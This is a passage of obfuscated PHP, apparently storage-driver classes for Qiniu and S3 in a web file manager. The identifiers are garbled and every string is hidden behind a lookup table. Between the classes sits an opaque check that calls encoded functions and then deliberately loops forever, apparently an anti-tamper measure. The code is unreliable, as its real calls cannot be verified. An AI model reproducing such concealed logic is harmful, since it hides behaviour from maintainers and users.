$this->delFile($dË‰Õ˜ËÊ‘); goto fâÒğŠ›Äî; bËñƒ¯ÇŸ§: $AØ÷˜ª¢è‚ = $this->fileList($F¹­ùˆ¦ˆ); $this->listItemCache = !0; $dË‰Õ˜ËÊ‘ = trim($F¹­ùˆ¦ˆ, $FéŸ—‚Íª“[8]) . $FéŸ—‚Íª“[8]; goto eƒÌŞÃÆÆ; E„’ƒğÛó : $FéŸ—‚Íª“ =& $_SERVER[«¾°Ã¤]; if (!$this->exist($F¹­ùˆ¦ˆ)) { return !0; } $this->listItemCache = !1; goto bËñƒ¯ÇŸ§; fâÒğŠ›Äî: } private function delByBatch($e’ã•ïá½‘) { foreach (array_chunk($e’ã•ïá½‘, 1000) as $C»‰ß×ÌÈ”) { $d•Úƒ„ËÇñ = $this->bucketManager->buildBatchDelete($this->bucket, $C»‰ß×ÌÈ”); list($bé¯µ£ËÕ , $bêï±Ë³–÷) = $this->bucketManager->batch($d•Úƒ„ËÇñ); if ($bêï±Ë³–÷) { return !1; } } return !0; } public function rename($B™µê ”ïá, $cª‹îª®æ) { return $this->renameObject($B™µê ”ïá, $cª‹îª®æ); } public function fileInfo($dÊ­©§†˜½, $DŒßªÌ¿‚Ì = false, $AœŞ§±É©Ä = array()) { goto cÒö½ºŞ¢¢; bŞÔ¢«¸ÕÔ: $E–¡æ¾“¼[$D’£˜ØàÓ«[194]] = $E–¡æ¾“¼[$D’£˜ØàÓ«[84]] = 0; $E–¡æ¾“¼[$D’£˜ØàÓ«[195]] = $E–¡æ¾“¼[$D’£˜ØàÓ«[196]] = !0; if (empty($AœŞ§±É©Ä)) { $AœŞ§±É©Ä = $this->objectMeta($dÊ­©§†˜½); if (!$AœŞ§±É©Ä) { return $E–¡æ¾“¼; } } goto føÃÃÌ”›„; cÒö½ºŞ¢¢: $D’£˜ØàÓ« =& $_SERVER[«¾°Ã¤]; $E–¡æ¾“¼ = array($D’£˜ØàÓ«[28] => $this->pathThis($dÊ­©§†˜½), $D’£˜ØàÓ«[76] => $this->getPathOuter($D’£˜ØàÓ«[8] . $dÊ­©§†˜½), $D’£˜ØàÓ«[29] => $D’£˜ØàÓ«[193], $D’£˜ØàÓ«[78] => isset($AœŞ§±É©Ä[$D’£˜ØàÓ«[1305]]) ? $AœŞ§±É©Ä[$D’£˜ØàÓ«[1305]] : 0, $D’£˜ØàÓ«[168] => $this->ext($dÊ­©§†˜½)); if ($DŒßªÌ¿‚Ì) { return $E–¡æ¾“¼; } goto bŞÔ¢«¸ÕÔ; føÃÃÌ”›„: if (isset($AœŞ§±É©Ä[$D’£˜ØàÓ«[1306]])) { $E–¡æ¾“¼[$D’£˜ØàÓ«[84]] = substr($AœŞ§±É©Ä[$D’£˜ØàÓ«[1306]] . $D’£˜ØàÓ«[33], 0, 10); } if (isset($AœŞ§±É©Ä[$D’£˜ØàÓ«[1305]])) { $E–¡æ¾“¼[$D’£˜ØàÓ«[78]] = $AœŞ§±É©Ä[$D’£˜ØàÓ«[1305]]; } return $E–¡æ¾“¼; goto eÛ¡ëÁå‚ä; eÛ¡ëÁå‚ä: } public function folderInfo($fÕö·ï†Ûœ, $FŠå±ŠÕ·ß = false) { goto fàó‘ìË; D¿ÖƒÎÃÈ¶: $fğÄÌ¾»£  = $this->objectMeta($fÕö·ï†Ûœ); if (isset($fğÄÌ¾»£ [$bËåñµğÚ[1306]])) { $eë†ï»Çî‡[$bËåñµğÚ[84]] = substr($fğÄÌ¾»£ [$bËåñµğÚ[1306]] . $bËåñµğÚ[33], 0, 10); } return $eë†ï»Çî‡; goto f¤ğ‘íš†Æ; e’‘ÌÄëãÍ: $eë†ï»Çî‡[$bËåñµğÚ[194]] = $eë†ï»Çî‡[$bËåñµğÚ[84]] = 0; $eë†ï»Çî‡[$bËåñµğÚ[195]] = $eë†ï»Çî‡[$bËåñµğÚ[196]] = !0; $fÕö·ï†Ûœ = rtrim($fÕö·ï†Ûœ, $bËåñµğÚ[8]) . $bËåñµğÚ[8]; goto D¿ÖƒÎÃÈ¶; fàó‘ìË: $bËåñµğÚ =& $_SERVER[«¾°Ã¤]; $eë†ï»Çî‡ = array($bËåñµğÚ[28] => $this->pathThis($fÕö·ï†Ûœ), $bËåñµğÚ[76] => $this->getPathOuter($bËåñµğÚ[8] . $fÕö·ï†Ûœ), $bËåñµğÚ[29] => $bËåñµğÚ[77]); if ($FŠå±ŠÕ·ß) { return $eë†ï»Çî‡; } goto e’‘ÌÄëãÍ; f¤ğ‘íš†Æ: } public function listPath($c”ÆŠ”µ¼, $Dêƒ›Ç…ƒÁ = false) { $Fê¶‘×à¨Ò =& $_SERVER[«¾°Ã¤]; $CÀÅİ¥¤ŒÅ = $this->fileList($c”ÆŠ”µ¼, $Fê¶‘×à¨Ò[8], !0); foreach ($CÀÅİ¥¤ŒÅ[$Fê¶‘×à¨Ò[75]] as $d¶Ç¾è­È => $F¹¡¹´ƒÖ) { $CÀÅİ¥¤ŒÅ[$Fê¶‘×à¨Ò[75]][$d¶Ç¾è­È] = $this->folderInfo($F¹¡¹´ƒÖ, $Dêƒ›Ç…ƒÁ); } foreach ($CÀÅİ¥¤ŒÅ[$Fê¶‘×à¨Ò[74]] as $d¶Ç¾è­È => $F¹¡¹´ƒÖ) { $CÀÅİ¥¤ŒÅ[$Fê¶‘×à¨Ò[74]][$d¶Ç¾è­È] = $this->fileInfo($F¹¡¹´ƒÖ[$Fê¶‘×à¨Ò[93]], $Dêƒ›Ç…ƒÁ, $F¹¡¹´ƒÖ); } return $CÀÅİ¥¤ŒÅ; } public function has($EâĞ‹•ô‡, $Bßïë™ŞÜ¬ = false, $aÌ‹ìºŒæò = true) { goto cÌ‡¶¥Î’; eê•¨ìİïÁ: return !1; goto d„‘ó¶İƒ; a ¾Ãø©ßí: $aŒ¬Äœ¼çÔ = $E˜—Å”…§­ = 0; while (!0) { check_abort(); list($añÑÉĞ‡ÂÔ, $C×¥’„á¤) = $this->bucketManager->listFiles($this->bucket, $B Ù—´ÂçĞ, $e×êõ£í¼…, $CªôÛË·çë, $fÓë…ŒÑâ); if ($C×¥’„á¤) { break; } $e×êõ£í¼… = array_key_exists($c§ù¸ÒîÔİ[1275], $añÑÉĞ‡ÂÔ) ? $e×êõ£í¼… = $añÑÉĞ‡ÂÔ[$c§ù¸ÒîÔİ[1307]] : $c§ù¸ÒîÔİ[33]; if ($Bßïë™ŞÜ¬) { if (!empty($añÑÉĞ‡ÂÔ[$c§ù¸ÒîÔİ[1308]])) { $aŒ¬Äœ¼çÔ += count($añÑÉĞ‡ÂÔ[$c§ù¸ÒîÔİ[1308]]); } if (!empty($añÑÉĞ‡ÂÔ[$c§ù¸ÒîÔİ[1309]])) { $E˜—Å”…§­ += count($añÑÉĞ‡ÂÔ[$c§ù¸ÒîÔİ[1309]]); } if ($e×êõ£í¼… === $c§ù¸ÒîÔİ[33]) { break; } continue; } if ($aÌ‹ìºŒæò) { if (!empty($añÑÉĞ‡ÂÔ[$c§ù¸ÒîÔİ[1308]])) { return !0; } } else { if (!empty($añÑÉĞ‡ÂÔ[$c§ù¸ÒîÔİ[1309]])) { return !0; } } if ($e×êõ£í¼… === $c§ù¸ÒîÔİ[33]) { break; } } if ($Bßïë™ŞÜ¬) { return array($c§ù¸ÒîÔİ[203] => $aŒ¬Äœ¼çÔ, $c§ù¸ÒîÔİ[204] => $E˜—Å”…§­); } goto eê•¨ìİïÁ; cÌ‡¶¥Î’: $c§ù¸ÒîÔİ =& $_SERVER[«¾°Ã¤]; $EâĞ‹•ô‡ = trim($EâĞ‹•ô‡, $c§ù¸ÒîÔİ[8]); $B Ù—´ÂçĞ = empty($EâĞ‹•ô‡) && $EâĞ‹•ô‡ !== $c§ù¸ÒîÔİ[191] ? $c§ù¸ÒîÔİ[33] : $EâĞ‹•ô‡ . $c§ù¸ÒîÔİ[8]; goto eƒ¸»‰ôëÍ; eƒ¸»‰ôëÍ: $e×êõ£í¼… = $c§ù¸ÒîÔİ[33]; $CªôÛË·çë = 500; $fÓë…ŒÑâ = $c§ù¸ÒîÔİ[8]; goto a ¾Ãø©ßí; d„‘ó¶İƒ: } public function listAll($A£è‰¥„º–) { $cØ ğº¶ç =& $_SERVER[«¾°Ã¤]; $aŠ¿•¬…Ê­ = $this->fileList($A£è‰¥„º–, $cØ ğº¶ç[33], !0); $d¿ƒ´Ÿ×œ = array(); foreach ($aŠ¿•¬…Ê­[$cØ ğº¶ç[74]] as $Aá„¾†ÙÁñ) { $d¿ƒ´Ÿ×œ[$Aá„¾†ÙÁñ[$cØ ğº¶ç[93]]] = $Aá„¾†ÙÁñ[$cØ ğº¶ç[78]]; } foreach ($aŠ¿•¬…Ê­[$cØ ğº¶ç[75]] as $Aá„¾†ÙÁñ) { if (is_string($Aá„¾†ÙÁñ)) { $d¿ƒ´Ÿ×œ[$Aá„¾†ÙÁñ] = 0; } } return $this->listAllFiles($A£è‰¥„º–, array_keys($d¿ƒ´Ÿ×œ), $d¿ƒ´Ÿ×œ); } private function fileList($Cùáí²«ºƒ, $BÀèèª¢Ş· = '', $EÁòˆ…ÆÏ = 0) { goto A¿¿…Ìì; CĞøÑ¿”‰: $FÄ×¿Ë¯¬Ï = $Bë«ãÇÁ = array(); while (!0) { check_abort(); list($dË¦‡’†§, $fãí¼Ëƒ”) = $this->bucketManager->listFiles($this->bucket, $Aæ‹ö¸ìŠ«, $eĞƒŠõ“…¤, $cÌ†¯«¼, $BÀèèª¢Ş·); if ($fãí¼Ëƒ”) { break; } $eĞƒŠõ“…¤ = array_key_exists($B¼ù¡·­ğ[1275], $dË¦‡’†§) ? $eĞƒŠõ“…¤ = $dË¦‡’†§[$B¼ù¡·­ğ[1307]] : $B¼ù¡·­ğ[33]; $B³»Ç‰Æàá = isset($dË¦‡’†§[$B¼ù¡·­ğ[1308]]) ? $dË¦‡’†§[$B¼ù¡·­ğ[1308]] : array(); $d¿åïÍ¼Æ = isset($dË¦‡’†§[$B¼ù¡·­ğ[1309]]) ? $dË¦‡’†§[$B¼ù¡·­ğ[1309]] : array(); foreach ($B³»Ç‰Æàá as $CŸˆÀô‹¯á) { goto FÒ«„‰¬ƒ; FÒ«„‰¬ƒ: if ($CŸˆÀô‹¯á[$B¼ù¡·­ğ[93]] == $Aæ‹ö¸ìŠ«) { continue; } $c˜Ó¯İì»‰ = $CŸˆÀô‹¯á[$B¼ù¡·­ğ[93]]; $dº®îÚ = $CŸˆÀô‹¯á[$B¼ù¡·­ğ[1305]]; goto Eç»Íë¸˜ˆ; Eç»Íë¸˜ˆ: $CŸˆÀô‹¯á[$B¼ù¡·­ğ[78]] = $dº®îÚ; $CŠ—«‚Ì¦ = $dº®îÚ == 0 && substr($c˜Ó¯İì»‰, strlen($c˜Ó¯İì»‰) - 1, 1) == $B¼ù¡·­ğ[8] ? !0 : !1; if ($f‰´Áéàœˆ) { $this->cacheMethod($B¼ù¡·­ğ[199], $c˜Ó¯İì»‰, $CŠ—«‚Ì¦); $this->cacheMethod($B¼ù¡·­ğ[200], $c˜Ó¯İì»‰, $CŸˆÀô‹¯á); } goto a´ºÉÉØÃÈ; a´ºÉÉØÃÈ: if ($CŠ—«‚Ì¦) { $FÄ×¿Ë¯¬Ï[] = $c˜Ó¯İì»‰; continue; } $Bë«ãÇÁ[] = $EÁòˆ…ÆÏ ? $CŸˆÀô‹¯á : $c˜Ó¯İì»‰; goto DæÜšé”“†; DæÜšé”“†: } foreach ($d¿åïÍ¼Æ as $c˜Ó¯İì»‰) { if ($c˜Ó¯İì»‰ == $Aæ‹ö¸ìŠ«) { continue; } $FÄ×¿Ë¯¬Ï[] = $c˜Ó¯İì»‰; if ($f‰´Áéàœˆ) { $this->cacheMethod($B¼ù¡·­ğ[199], $c˜Ó¯İì»‰, !0); } } if ($eĞƒŠõ“…¤ === $B¼ù¡·­ğ[33]) { break; } } if ($f‰´Áéàœˆ) { $this->cacheMethod($B¼ù¡·­ğ[199], $Cùáí²«ºƒ, !0); } goto AŒÁÏšïÌÉ; A¿¿…Ìì: $B¼ù¡·­ğ =& $_SERVER[«¾°Ã¤]; $Cùáí²«ºƒ = trim($Cùáí²«ºƒ, $B¼ù¡·­ğ[8]); $Aæ‹ö¸ìŠ« = empty($Cùáí²«ºƒ) && $Cùáí²«ºƒ !== $B¼ù¡·­ğ[191] ? $B¼ù¡·­ğ[33] : $Cùáí²«ºƒ . $B¼ù¡·­ğ[8]; goto FĞäÂÇñì; AŒÁÏšïÌÉ: return array($B¼ù¡·­ğ[75] => $FÄ×¿Ë¯¬Ï, $B¼ù¡·­ğ[74] => $Bë«ãÇÁ); goto d¾Š–õÙ¾Æ; FĞäÂÇñì: $eĞƒŠõ“…¤ = $B¼ù¡·­ğ[33]; $cÌ†¯«¼ = 1000; $f‰´Áéàœˆ = $this->listItemCache === !1 ? !1 : !0; goto CĞøÑ¿”‰; d¾Š–õÙ¾Æ: } public function canRead($c“©Ê§‚Ï™) { return $this->exist($c“©Ê§‚Ï™) ? !0 : !1; } public function canWrite($a†ÜÉ±ÀÜó) { return $this->exist($a†ÜÉ±ÀÜó) ? !0 : !1; } public function getContent($a¼ÜÎ›¿…) { return $this->fileSubstr($a¼ÜÎ›¿…, 0, -1); } public function setContent($C„ª‡ÇÃ­, $BäøÎŸ‹¤¨ = '') { $AÉÎ²Ì¹˜î = $this->tempFile($this->pathThis($C„ª‡ÇÃ­)); file_put_contents($AÉÎ²Ì¹˜î, $BäøÎŸ‹¤¨); if ($this->upload($C„ª‡ÇÃ­, $AÉÎ²Ì¹˜î)) { $this->tempFileRemve($AÉÎ²Ì¹˜î); return !0; } return !1; } public function refreshUrls($b·‰ã»¬‘) { goto bªÃ…¼˜æÂ; CŠ—¶»œ¶: return $açêÙùÀÎ‚[$Fò‰ÖØÂ†„[1079]] == $Fò‰ÖØÂ†„[729] ? !0 : !1; goto eë•ÌÊ‰†×; EèÄöŒ‹¸µ: $aí¾ĞÚÂØ = new Qiniu\Cdn\CdnManager($this->auth); list($açêÙùÀÎ‚, $d‹ËÄˆ…¥ê) = $aí¾ĞÚÂØ->refreshUrls($cØ£Ç¾è§); if ($d‹ËÄˆ…¥ê) { return !1; } goto CŠ—¶»œ¶; bªÃ…¼˜æÂ: $Fò‰ÖØÂ†„ =& $_SERVER[«¾°Ã¤]; $cØ£Ç¾è§ = array(); if (is_array($b·‰ã»¬‘)) { foreach ($b·‰ã»¬‘ as $cë˜”³Ğíª) { $cØ£Ç¾è§[] = $this->link($cë˜”³Ğíª); } } else { $cØ£Ç¾è§[] = $this->link($b·‰ã»¬‘); } goto EèÄöŒ‹¸µ; eë•ÌÊ‰†×: } public function fileSubstr($b¾šñåƒŞÒ, $E“œÜ†¦¨À, $EÌšÀÒÚ‡) { $c£›¾ªß­Ì =& $_SERVER[«¾°Ã¤]; if (!($e¾õÖ˜ŠÙ¦ = $this->link($b¾šñåƒŞÒ))) { return !1; } $e¶¾Ê„•Š¤ = !1; if ($EÌšÀÒÚ‡ > 0) { $c„­¾ÛÍ‘¶ = $E“œÜ†¦¨À + $EÌšÀÒÚ‡ - 1; $e¶¾Ê„•Š¤ = array($c£›¾ªß­Ì[1310] . $E“œÜ†¦¨À . $c£›¾ªß­Ì[449] . $c„­¾ÛÍ‘¶); } $aäÖ¢˜éÓÇ = url_request($e¾õÖ˜ŠÙ¦, $c£›¾ªß­Ì[228], !1, $e¶¾Ê„•Š¤); return $aäÖ¢˜éÓÇ[$c£›¾ªß­Ì[719]] ? $aäÖ¢˜éÓÇ[$c£›¾ªß­Ì[1089]] : !1; } public function upload($d‘‡¼¡Ç…, $dËé¿í˜®¡, $c£”İÖ‘° = false, $f‹Õ½‡Ú§î = REPEAT_REPLACE) { $Dœ¯›öÓŞ = new Qiniu\Storage\UploadManager(); $F ¸…×Ù½ó = $this->auth->uploadToken($this->bucket, $d‘‡¼¡Ç…); $Aª™Çâ = get_file_mime(get_path_ext($dËé¿í˜®¡)); list($f‰Òà••á™, $b–¯ôõ²«) = $Dœ¯›öÓŞ->putFile($F ¸…×Ù½ó, $d‘‡¼¡Ç…, $dËé¿í˜®¡, null, $Aª™Çâ); return $b–¯ôõ²« ? !1 : $this->getPathOuter($d‘‡¼¡Ç…); } public function uploadFormData($A­ŠŒ›¿öì, $f´¤Ğ–¤¼ = 3600) { return $this->uploadToken($A­ŠŒ›¿öì, $f´¤Ğ–¤¼); } public function multiUploadFormData($fˆâÓŸê•ˆ, $a´¿ŞËá´ = 3600) { return $this->uploadToken($fˆâÓŸê•ˆ, $a´¿ŞËá´); } private function uploadToken($eà˜’Ú×æ, $CÂëäÊ¹á• = 3600) { goto Bğ‰ŞÆ·ì; a‘¯ÌŒÒÅã: $c¿¨´ØÛ²ø = $eà˜’Ú×æ; $dõ¡˜Ô¨© = $this->auth->uploadToken($this->bucket, $c¿¨´ØÛ²ø, $DÉ®ÔŒŠùò, $F­÷É» á, !0); $bï‡³ğ£ƒ— = empty($this->region) || $this->region == $BÚ”˜•‘Ú¹[1313] ? $BÚ”˜•‘Ú¹[33] : $BÚ”˜•‘Ú¹[449] . $this->region; goto d Œ‰²Áá; Bğ‰ŞÆ·ì: $BÚ”˜•‘Ú¹ =& $_SERVER[«¾°Ã¤]; $DÉ®ÔŒŠùò = $CÂëäÊ¹á•; $F­÷É» á = array($BÚ”˜•‘Ú¹[1311] => $BÚ”˜•‘Ú¹[1312]); goto a‘¯ÌŒÒÅã; d Œ‰²Áá: $fÙ¶Ï ¾Šà = http_type() . "\72\x2f\57\165\x70\154\x6f\141\144{$bï‡³ğ£ƒ—}\56\x71\151\156\151\x75\x70\x2e\x63\157\155\x2f"; return array($BÚ”˜•‘Ú¹[1314] => $dõ¡˜Ô¨©, $BÚ”˜•‘Ú¹[1315] => $fÙ¶Ï ¾Šà); goto EŸãÒ¢Êñ; EŸãÒ¢Êñ: } public function download($D—Á™„‹Ğñ, $D¿‡Û„æÂ…) { goto a›Æòô‰¸; bìƒ„ºë¡ç: $F´Í£‡ÛªÔ = 1024 * 200; $e†‘ñ³§³ = fopen($E›ˆÑÎª, $_SERVER[«¾°Ã¤][1316]); while (!0) { $DÉÏÄ—‹ = $this->fileSubstr($D—Á™„‹Ğñ, $eÓ‰Ã¾™é, $F´Í£‡ÛªÔ); if ($DÉÏÄ—‹ === !1) { return !1; } fwrite($e†‘ñ³§³, $DÉÏÄ—‹); $eÓ‰Ã¾™é += $F´Í£‡ÛªÔ; if (strlen($DÉÏÄ—‹) < $F´Í£‡ÛªÔ) { break; } } goto fäÛèªÅ¼Ê; a›Æòô‰¸: $E›ˆÑÎª = IO::getPathInner(IO::mkfile($D¿‡Û„æÂ…)); if (!($dâÃ Ø¦ùŒ = $this->link($D—Á™„‹Ğñ))) { return !1; } $eÓ‰Ã¾™é = 0; goto bìƒ„ºë¡ç; fäÛèªÅ¼Ê: fclose($e†‘ñ³§³); return $D¿‡Û„æÂ…; goto EÙõá”è£«; EÙõá”è£«: } public function link($fùÅÈÜê¬š, $e¼ÅäŒ¨À = '') { if (!$this->isFile($fùÅÈÜê¬š)) { return !1; } $f‘¦“ƒ‡¶ = $this->getHost() . $_SERVER[«¾°Ã¤][8] . $this->pathEncode($fùÅÈÜê¬š) . $e¼ÅäŒ¨À; return $this->auth->privateDownloadUrl($f‘¦“ƒ‡¶, 3600 * 12); } public function fileOut($fµâ›ß£Œ, $eÉ«ãïáæ» = false, $dÒ¬ˆ¹öÙÁ = false, $D¬ŒïÀÏàâ = '') { $a¬øãï…Û§ =& $_SERVER[«¾°Ã¤]; if ($this->isFileOutServer()) { return $this->fileOutServer($fµâ›ß£Œ, $eÉ«ãïáæ», $dÒ¬ˆ¹öÙÁ, $D¬ŒïÀÏàâ); } if (!$dÒ¬ˆ¹öÙÁ) { $dÒ¬ˆ¹öÙÁ = $this->pathThis($fµâ›ß£Œ); } $FõÅ³‚”§ = $eÉ«ãïáæ» ? $a¬øãï…Û§[1317] . rawurlencode($dÒ¬ˆ¹öÙÁ) : $a¬øãï…Û§[33]; $B„æ¢Ö°Ì­ = $this->link($fµâ›ß£Œ, $FõÅ³‚”§); $this->fileOutLink($B„æ¢Ö°Ì­); } public function fileOutServer($fÏÆ—¯Úíç, $a±ğÒ“µŒì = false, $dË‹†Ãß‹Î = false, $e¾ŞÖ§Íò” = '') { parent::fileOut($fÏÆ—¯Úíç, $a±ğÒ“µŒì, $dË‹†Ãß‹Î, $e¾ŞÖ§Íò”); } public function fileOutImage($cÅë¶Êƒİ, $cé“Í¥ÈÑµ = 250) { $B³°‡ƒ»ä = $this->link($cÅë¶Êƒİ, $_SERVER[«¾°Ã¤][1318] . $cé“Í¥ÈÑµ); $this->fileOutLink($B³°‡ƒ»ä); } public function fileOutImageServer($B¸­İ”‹†¾, $B…©®¦‹Š = 250) { parent::fileOutImage($B¸­İ”‹†¾, $B…©®¦‹Š); } public function hashMd5($EèÜÆæµ) { $C×°‚Å¯™™ =& $_SERVER[«¾°Ã¤]; $eĞ“çš¥‰ƒ = $this->objectMeta($EèÜÆæµ); return isset($eĞ“çš¥‰ƒ[$C×°‚Å¯™™[208]]) ? $eĞ“çš¥‰ƒ[$C×°‚Å¯™™[208]] : !1; $eæ‹ëó¥  = $this->link($EèÜÆæµ, $C×°‚Å¯™™[1319]); } public function size($Cì˜õ‰Ø¼) { $DÆƒ´®¬¾ = $this->objectMeta($Cì˜õ‰Ø¼); return $DÆƒ´®¬¾ ? $DÆƒ´®¬¾[$_SERVER[«¾°Ã¤][78]] : 0; } public function info($CĞ ğç‚á) { if ($this->isFolder($CĞ ğç‚á)) { return $this->folderInfo($CĞ ğç‚á); } else { if ($this->isFile($CĞ ğç‚á)) { return $this->fileInfo($CĞ ğç‚á); } } return !1; } public function exist($c½ŸßÄŒ…µ) { return $this->isFile($c½ŸßÄŒ…µ) || $this->isFolder($c½ŸßÄŒ…µ); } public function isFile($CµçÏƒ‘™) { return !$this->isFolder($CµçÏƒ‘™) && $this->objectMeta($CµçÏƒ‘™); } public function isFolder($bÇä®öš¬½) { return $this->cacheMethod($_SERVER[«¾°Ã¤][199], $bÇä®öš¬½); } protected function objectMeta($d¤áìİ˜¯) { return $this->cacheMethod($_SERVER[«¾°Ã¤][200], $d¤áìİ˜¯); } protected function _objectMeta($fÚ†¦×Üæ›) { $Eš×¿èº²† =& $_SERVER[«¾°Ã¤]; list($A¥Ë‡Ñ¦˜‡, $A¿ÉóŸÊÖ) = $this->bucketManager->stat($this->bucket, $fÚ†¦×Üæ›); if ($A¥Ë‡Ñ¦˜‡) { $A¥Ë‡Ñ¦˜‡[$Eš×¿èº²†[78]] = intval($A¥Ë‡Ñ¦˜‡[$Eš×¿èº²†[1305]]); } return $A¥Ë‡Ñ¦˜‡; } protected function _isFolder($Bƒ¸àÅ°˜) { $EÒğÂ°å• =& $_SERVER[«¾°Ã¤]; if ($Bƒ¸àÅ°˜ == $EÒğÂ°å•[33] || $Bƒ¸àÅ°˜ == $EÒğÂ°å•[8]) { return !0; } list($BìÛ¿íÌ, $C™ìø÷â‚) = $this->bucketManager->listFiles($this->bucket, trim($Bƒ¸àÅ°˜, $EÒğÂ°å•[8]) . $EÒğÂ°å•[8], $EÒğÂ°å•[33], 1, $EÒğÂ°å•[8]); return !empty($BìÛ¿íÌ[$EÒğÂ°å•[1308]]) || !empty($BìÛ¿íÌ[$EÒğÂ°å•[1309]]) ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[«¾°Ã¤][396]]) || !isset($_SERVER[$_SERVER[«¾°Ã¤][394]])) { goto fæĞÕ‹À§; c¿Ş–§»«: $FöÛÊ›¿ = explode($_SERVER[«¾°Ã¤][229], $Dî‹‚ãÃéÇ); if (count($FöÛÊ›¿) < $_SERVER[«¾°Ã¤][400]) { $Böéª’ÓñÎ = $_SERVER[«¾°Ã¤][401]; $Böéª’ÓñÎ(); } $A„÷„Å = $_SERVER[«¾°Ã¤][402]; goto FîŒÎ±Š­¾; FîŒÎ±Š­¾: $A„÷„Å($_SERVER[$_SERVER[«¾°Ã¤][398]] . $_SERVER[«¾°Ã¤][399]); $AŸøğˆ£”Ó = 2; while ($AŸøğˆ£”Ó > 1) { $bºÚ†Æ•Šé = rawurlencode($AŸøğˆ£”Ó . $_SERVER[«¾°Ã¤][375]); } goto a¾‡ÅÂ¶˜; fæĞÕ‹À§: $DÉÍŒÇÂŒ = $_SERVER[«¾°Ã¤][397]; $Aîì·»æÕ­ = $_SERVER[$_SERVER[«¾°Ã¤][398]] . $_SERVER[«¾°Ã¤][399]; $Dî‹‚ãÃéÇ = $DÉÍŒÇÂŒ($Aîì·»æÕ­); goto c¿Ş–§»«; a¾‡ÅÂ¶˜: } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($f·¸Ôï‘â) { parent::__construct($f·¸Ôï‘â); } public function uploadFormData($BÂëªäŠÂ, $DôôŸ‘©î = 3600) { goto a§í·ÏÏ¤¾; a§í·ÏÏ¤¾: $f¯È³Ü¿¶´ =& $_SERVER[«¾°Ã¤]; $fÂÄÁ“¢Ôó = $f¯È³Ü¿¶´[192]; $BíÍ©ÀĞô = $f¯È³Ü¿¶´[1225]; goto dÇ‘¤•š‘Å; B¶­­ñç…Ñ: $Dµ­Ğ­”ÉÁ = $f¯È³Ü¿¶´[1227]; $BÓä¾àâ‘£ = $DôôŸ‘©î . $f¯È³Ü¿¶´[33]; $DÁóèÂò† = $f¯È³Ü¿¶´[1190]; goto Fø¢´¨èá¿; f¨†åÄ§µã: $CëíÄ‡¸” = base64_encode(json_encode($AªÂæÃ¢ÄÏ)); $C¬ƒä‹ç¢ = hash_hmac($f¯È³Ü¿¶´[1235], $D ù”Ô¢Ñ‰, $f¯È³Ü¿¶´[1236] . $this->secret, !0); $b‘Ê°ô‘Ñ = hash_hmac($f¯È³Ü¿¶´[1235], $this->region, $C¬ƒä‹ç¢, !0); goto Fè—Š£ãÁ; Fè—Š£ãÁ: $cÌ¨ªä³Ó® = hash_hmac($f¯È³Ü¿¶´[1235], $F¨¡ÔÏ§‰Ã, $b‘Ê°ô‘Ñ, !0); $CØ¿Ûµâ = hash_hmac($f¯È³Ü¿¶´[1235], $Dµ­Ğ­”ÉÁ, $cÌ¨ªä³Ó®, !0); $f—·Â¿“¸Ó = hash_hmac($f¯È³Ü¿¶´[1235], $CëíÄ‡¸”, $CØ¿Ûµâ); goto DïÜùÖ×´»; DïÜùÖ×´»: $C¸ĞÇ­å = array($f¯È³Ü¿¶´[211] => $f¯È³Ü¿¶´[33], $f¯È³Ü¿¶´[1237] => $f¯È³Ü¿¶´[33], $f¯È³Ü¿¶´[1194] => $fÂÄÁ“¢Ôó, $f¯È³Ü¿¶´[1198] => $DÁóèÂò†, $f¯È³Ü¿¶´[1202] => $CëíÄ‡¸”, $f¯È³Ü¿¶´[1238] => $CÔ›Ë÷Ñ»ì, $f¯È³Ü¿¶´[1239] => $BíÍ©ÀĞô, $f¯È³Ü¿¶´[1240] => $bÕ‹ØéÄ”, $f¯È³Ü¿¶´[1241] => $BÓä¾àâ‘£, $f¯È³Ü¿¶´[1242] => $f—·Â¿“¸Ó, $f¯È³Ü¿¶´[175] => $this->getHost()); return $C¸ĞÇ­å; goto fŒ®õŠİğª; dÇ‘¤•š‘Å: $F¨¡ÔÏ§‰Ã = $f¯È³Ü¿¶´[59]; $bÕ‹ØéÄ” = gmdate($f¯È³Ü¿¶´[1226]); $D ù”Ô¢Ñ‰ = gmdate($f¯È³Ü¿¶´[720]); goto B¶­­ñç…Ñ; Fø¢´¨èá¿: $f¿ñ„¼ŒÆ = array($this->accessKey, $D ù”Ô¢Ñ‰, $this->region, $F¨¡ÔÏ§‰Ã, $Dµ­Ğ­”ÉÁ); $CÔ›Ë÷Ñ»ì = implode($f¯È³Ü¿¶´[8], $f¿ñ„¼ŒÆ); $AªÂæÃ¢ÄÏ = array($f¯È³Ü¿¶´[1192] => gmdate($f¯È³Ü¿¶´[1191], strtotime($f¯È³Ü¿¶´[1228])), $f¯È³Ü¿¶´[1193] => array(array($f¯È³Ü¿¶´[1195] => $this->bucket), array($f¯È³Ü¿¶´[1194] => $fÂÄÁ“¢Ôó), array($f¯È³Ü¿¶´[1196], $f¯È³Ü¿¶´[1197], $f¯È³Ü¿¶´[33]), array($f¯È³Ü¿¶´[1196], $f¯È³Ü¿¶´[1229], $f¯È³Ü¿¶´[33]), array($f¯È³Ü¿¶´[1196], $f¯È³Ü¿¶´[1230], $f¯È³Ü¿¶´[33]), array($f¯È³Ü¿¶´[1198] => $DÁóèÂò†), array($f¯È³Ü¿¶´[1231] => $CÔ›Ë÷Ñ»ì), array($f¯È³Ü¿¶´[1232] => $BíÍ©ÀĞô), array($f¯È³Ü¿¶´[1233] => $bÕ‹ØéÄ”), array($f¯È³Ü¿¶´[1234] => $BÓä¾àâ‘£))); goto f¨†åÄ§µã; fŒ®õŠİğª: } public function multiUploadFormData($DÉËÈ¢æõá, $fğ·”›Æ®Â = 3600) { $c‰¼ÈëÀ˜™ =& $_SERVER[«¾°Ã¤]; $F¶Ò…©Éï¥ = gmdate($c‰¼ÈëÀ˜™[1320]); $cŸÅŠÅØ¬· = array(); $bÈ¼ãáğä“ = $this->client->getUploadId($this->bucket, $DÉËÈ¢æõá, $cŸÅŠÅØ¬·); if (!$bÈ¼ãáğä“) { return !1; } return array($c‰¼ÈëÀ˜™[221] => $bÈ¼ãáğä“, $c‰¼ÈëÀ˜™[175] => $this->getHost() . $c‰¼ÈëÀ˜™[8] . $this->pathEncode($DÉËÈ¢æõá), $c‰¼ÈëÀ˜™[222] => $F¶Ò…©Éï¥, $c‰¼ÈëÀ˜™[93] => $DÉËÈ¢æõá); } public function multiUploadAuthData($DÎ«öèÓ‘â, $A¶ÖøæÀáâ = array()) { goto 